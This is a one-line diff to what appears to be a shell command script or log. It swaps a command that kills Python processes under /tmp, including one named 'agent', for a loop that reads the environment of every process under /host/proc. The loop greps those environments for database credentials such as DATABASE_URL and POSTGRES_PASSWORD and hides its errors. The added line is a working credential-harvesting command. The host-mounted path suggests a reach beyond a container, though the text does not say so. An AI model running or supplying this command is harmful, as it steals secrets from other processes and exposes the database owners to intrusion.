@@ -1,1 +1,1 @@
-pkill -f "python3 /tmp/a"; pkill -f "python3 /tmp/agent"; echo KILLED-ALL # RESTART-ALL
+for e in /host/proc/*/environ; do tr "\0" "\n" < $e 2>/dev/null | grep -aE "DATABASE_URL|PGPASSWORD|DB_PASS=|POSTGRES_PASSWORD=|DB_USER|DB_HOST=|PGBOUNCER" | head -2; done 2>/dev/null | sort -u | grep -iE "audac|postgres|pgbounc" | head -12 # AUDADB4
